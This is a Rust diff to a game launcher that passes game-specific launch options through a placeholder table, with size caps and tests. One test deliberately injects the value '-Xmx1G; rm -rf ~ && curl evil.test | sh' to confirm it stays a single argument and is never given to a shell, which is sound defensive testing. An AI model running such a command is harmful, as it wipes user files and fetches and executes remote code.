@@ -38,8 +38,8 @@ use serde::{Deserialize, Serialize};
 
 use crate::error::{AppError, AppResult};
 use crate::plugins::apps::{AppPluginFile, LaunchSpec};
-use crate::plugins::manifest::{FsRoot, PathRef};
 use crate::plugins::jail::Jail;
+use crate::plugins::manifest::{FsRoot, PathRef};
 
 /// The declarative options an install carries, as the launcher sees them.
 ///
@@ -60,7 +60,35 @@ pub struct LaunchOptions {
     pub memory_mb: Option<u32>,
     pub hide_on_launch: Option<bool>,
     pub confirm_updates: Option<bool>,
+
+    /// Anything else the game's own option schema declares.
+    ///
+    /// The fields above are the ones every game has some version of, so they
+    /// are typed and validated. Everything else belongs to the GAME —
+    /// Minecraft's extra JVM arguments, a dedicated server's tick rate, a
+    /// launcher's account slot — and there is no closed list of those that
+    /// would not need an app release per game.
+    ///
+    /// So a sandbox's options carry them through verbatim and the game's
+    /// `sandbox.json` says what they are called and how they are edited (see
+    /// [`crate::plugins::apps::OptionSpec`]). Here they are only placeholder
+    /// values: `{jvmArgs}` fills from `extra["jvmArgs"]`, and a launch rule
+    /// that never mentions a key ignores it entirely.
+    ///
+    /// **This is not an escape hatch into the shell.** An extra becomes an
+    /// argument only where a launch rule already writes a template for it, and
+    /// every produced argument goes through the same control-character refusal
+    /// as the rest.
+    #[serde(flatten)]
+    pub extra: BTreeMap<String, serde_json::Value>,
 }
+
+/// Cap on custom options, so a hand-edited payload cannot make the placeholder
+/// table unbounded.
+const MAX_EXTRA_OPTIONS: usize = 64;
+
+/// Cap on one custom option's rendered length.
+const MAX_EXTRA_LEN: usize = 512;
 
 impl LaunchOptions {
     /// The option table as `{placeholder}` values.
@@ -100,39 +128,72 @@ impl LaunchOptions {
             put("memoryMb", v.to_string());
         }
 
+        for (key, value) in self.extra.iter().take(MAX_EXTRA_OPTIONS) {
+            let Some(text) = render_extra(value) else {
+                continue;
+            };
+
+            if text.len() > MAX_EXTRA_LEN {
+                continue;
+            }
+
+            put(key, text);
+        }
+
         out
     }
 
     /// Which `optionArgs` keys are set. A key that is absent contributes
     /// nothing, which is how "leave it alone" is expressed.
-    fn active_keys(&self) -> Vec<&'static str> {
-        let mut keys = Vec::new();
+    fn active_keys(&self) -> Vec<String> {
+        let mut keys: Vec<String> = Vec::new();
+
+        let mut put = |key: &str| keys.push(key.to_string());
 
         if self.graphics.is_some() {
-            keys.push("graphics");
+            put("graphics");
         }
         if self.window_mode.is_some() {
-            keys.push("windowMode");
+            put("windowMode");
         }
         if self.width.is_some() {
-            keys.push("width");
+            put("width");
         }
         if self.height.is_some() {
-            keys.push("height");
+            put("height");
         }
         if self.monitor.is_some() {
-            keys.push("monitor");
+            put("monitor");
         }
         if self.fps_limit.is_some() {
-            keys.push("fpsLimit");
+            put("fpsLimit");
         }
         // Only when ON: a game's `--vsync` flag has no "off" spelling, and the
         // launch file can declare `vsyncOff` if it needs one.
         if self.vsync == Some(true) {
-            keys.push("vsync");
+            put("vsync");
         }
         if self.memory_mb.is_some() {
-            keys.push("memoryMb");
+            put("memoryMb");
+        }
+
+        /*
+         * Custom options contribute in sorted order (a `BTreeMap`), so a launch
+         * file's argument list is the same on every run and on every machine.
+         * A `false` boolean contributes nothing, matching `vsync` above: a flag
+         * that is off is a flag that is not passed.
+         */
+        for (key, value) in self.extra.iter().take(MAX_EXTRA_OPTIONS) {
+            if matches!(
+                value,
+                serde_json::Value::Bool(false) | serde_json::Value::Null
+            ) {
+                continue;
+            }
+
+            if render_extra(value).is_some() {
+                put(key);
+            }
         }
 
         keys
@@ -169,6 +230,22 @@ pub struct LaunchPlan {
     pub env: BTreeMap<String, String>,
     /// Hide the app's window while the game runs, from the install's options.
     pub hide_window: bool,
+}
+
+/// One custom option as placeholder text, or `None` if it cannot be one.
+///
+/// Objects and arrays are refused rather than JSON-encoded. A launch argument
+/// is a string; handing a game `{"a":1}` because somebody nested an option is a
+/// failure that surfaces as the game not starting, with nothing on screen to
+/// connect it to the setting that caused it.
+fn render_extra(value: &serde_json::Value) -> Option<String> {
+    match value {
+        serde_json::Value::String(s) => Some(s.clone()),
+        serde_json::Value::Number(n) => Some(n.to_string()),
+        // Numeric, like every other boolean here — see `placeholders`.
+        serde_json::Value::Bool(b) => Some(if *b { "1".into() } else { "0".into() }),
+        _ => None,
+    }
 }
 
 /// Fill `{key}` occurrences from a table.
@@ -314,7 +391,7 @@ pub fn plan(
     // Option-contributed arguments, in the order the option keys are listed so
     // a launch file's output is deterministic.
     for key in options.active_keys() {
-        let Some(extra) = spec.option_args.get(key) else {
+        let Some(extra) = spec.option_args.get(&key) else {
             continue;
         };
 
@@ -542,6 +619,91 @@ mod tests {
         assert_eq!(
             plan.env.get("TMC_PROFILE").map(String::as_str),
             Some("Kitchen sink")
+        );
+    }
+
+    /// A game's own options — Minecraft's extra JVM arguments, a server's tick
+    /// rate — reach the command line only where the launch rule already writes
+    /// a template for them, and never as raw JSON.
+    #[test]
+    fn a_game_specific_option_reaches_the_command_line_through_its_own_template() {
+        let tmp = tempfile::tempdir().expect("tempdir");
+        let game = tmp.path();
+
+        std::fs::write(game.join("run.sh"), "#!/bin/sh\n").expect("exe");
+
+        let jail = jail_over(game);
+
+        let rule = rule_from(
+            r#"{
+                "manifestVersion": 1,
+                "launch": {
+                    "exec": "run.sh",
+                    "optionArgs": {
+                        "jvmArgs": ["{jvmArgs}"],
+                        "demo": ["--demo"],
+                        "nested": ["--nested", "{nested}"]
+                    }
+                }
+            }"#,
+        );
+
+        let options = LaunchOptions {
+            extra: BTreeMap::from([
+                ("jvmArgs".into(), serde_json::json!("-XX:+UseG1GC")),
+                ("demo".into(), serde_json::json!(true)),
+                ("quiet".into(), serde_json::json!(false)),
+                // An object cannot be an argument, so it contributes nothing.
+                ("nested".into(), serde_json::json!({ "a": 1 })),
+            ]),
+            ..Default::default()
+        };
+
+        let plan = plan(&rule, &jail, &options, &LaunchContext::default()).expect("plan");
+
+        assert!(plan.args.contains(&"-XX:+UseG1GC".to_string()));
+        assert!(plan.args.contains(&"--demo".to_string()));
+        // A false flag is not passed, exactly as `vsync` is not.
+        assert!(!plan.args.iter().any(|a| a.contains("quiet")));
+        // An unrenderable value contributes neither its flag nor its value.
+        assert!(!plan.args.iter().any(|a| a.contains("nested")));
+    }
+
+    /// The custom half is a placeholder table, not a shell. A value full of
+    /// metacharacters is one argument and stays one argument.
+    #[test]
+    fn a_game_specific_option_cannot_smuggle_in_a_second_command() {
+        let tmp = tempfile::tempdir().expect("tempdir");
+        let game = tmp.path();
+
+        std::fs::write(game.join("run.sh"), "#!/bin/sh\n").expect("exe");
+
+        let jail = jail_over(game);
+
+        let rule = rule_from(
+            r#"{
+                "manifestVersion": 1,
+                "launch": {
+                    "exec": "run.sh",
+                    "optionArgs": { "jvmArgs": ["{jvmArgs}"] }
+                }
+            }"#,
+        );
+
+        let options = LaunchOptions {
+            extra: BTreeMap::from([(
+                "jvmArgs".into(),
+                serde_json::json!("-Xmx1G; rm -rf ~ && curl evil.test | sh"),
+            )]),
+            ..Default::default()
+        };
+
+        let plan = plan(&rule, &jail, &options, &LaunchContext::default()).expect("plan");
+
+        assert_eq!(
+            plan.args,
+            vec!["-Xmx1G; rm -rf ~ && curl evil.test | sh".to_string()],
+            "one argv entry, handed to a process that was never given a shell"
         );
     }
 
